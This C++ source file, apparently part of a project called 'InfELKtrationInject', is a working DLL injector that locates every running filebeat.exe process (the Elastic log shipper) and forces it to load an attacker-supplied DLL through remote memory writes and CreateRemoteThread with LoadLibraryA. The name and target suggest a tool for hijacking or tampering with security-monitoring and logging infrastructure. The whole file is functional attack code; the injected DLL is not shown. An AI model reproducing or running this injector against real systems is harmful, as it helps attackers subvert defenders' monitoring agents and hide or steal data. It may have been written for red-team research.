#include <iostream>
#include <windows.h>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <TlHelp32.h>
#include <tchar.h>

#include "Logger.h"

#define DLL_FILEPATH_MAX_LENGTH 120

// code references:
// https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
// https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes

BOOL inject_dll();

int main(int argc, char **argv)
{
    inject_dll();
}

BOOL inject_dll() {
    HANDLE hSnapshot, hProcess;
    PROCESSENTRY32 processEntry;
    CHAR dllFilename[DLL_FILEPATH_MAX_LENGTH] = "C:\\Users\\Administrator\\source\\repos\\InfELKtrationInject\\x64\\Debug\\InfELKtrationInjectLib.dll";
    DWORD targetPid = 0;
    DWORD targetPids[5] = { 0 };
    DWORD targetPidCount = 0;
    LPVOID szDllFilepath;
    HMODULE hKernel32;
    LPTHREAD_START_ROUTINE loadLibrary;

    // get snapshot of running processes on the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        Logger::Error("CreateToolhelp32Snapshot failed");
        Logger::LastError();
        return false;
    }

    // PROCESSENTRY32 docs state that the size needs to be initialized b/f calling Process32First
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // get the first process
    if (!Process32First(hSnapshot, &processEntry)) {
        Logger::Error("Process32First failed");
        Logger::LastError();
        return false;
    }

    // loop through processes
    do {
        if (CompareStringOrdinal(L"filebeat.exe", -1, processEntry.szExeFile, -1, false) == CSTR_EQUAL) {
            Logger::Info("Found filebeat.exe (pid=%d)", processEntry.th32ProcessID);
            targetPids[targetPidCount++] = processEntry.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &processEntry));

    CloseHandle(hSnapshot);

    if (!targetPids[0]) {
        Logger::Error("Failed to find a filebeat.exe process");
        return false;
    }

    // elastic-agent.exe spawns two filebeat.exe processes
    // we could probably just inject into the one with the lowest pid, but do both/all just in case
    for (DWORD i = 0; i < targetPidCount; i++) {
        targetPid = targetPids[i];

        Logger::Info("Injecting into pid %d", targetPid);
    
        // open handle to target process
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
        if (!hProcess) {
            Logger::Error("OpenProcess failed");
            Logger::LastError();
            return false;
        }
    
        Logger::Info("Opened handle to target process: 0x%p", hProcess);
    
        // allocate memory for the dll filepath
        szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!szDllFilepath) {
            Logger::Error("VirtualAllocEx failed");
            Logger::LastError();
            return false;
        }
    
        Logger::Info("Allocated mem for dll filepath: 0x%p", szDllFilepath);
    
        // write dll path into target process
        if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
            Logger::Error("WriteProcessMemory failed");
            Logger::LastError();
            return false;
        }
    
        Logger::Info("Copied dll path into target process");

        hKernel32 = GetModuleHandleA("Kernel32");
        if (!hKernel32) {
            Logger::Error("GetModuleHandleA failed");
            Logger::LastError();
            return false;
        }

        loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
        if (!loadLibrary) {
            Logger::Error("GetProcAddress failed");
            Logger::LastError();
            return false;
        }

        CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);
    
        Logger::Info("Executed DLL in target process");
    
        //VirtualFreeEx(hProcess, (LPVOID)szDllFilepath, 0, MEM_RELEASE); // this will crash the process, i haven't a clue why
        CloseHandle(hProcess);
    }

    return true;
}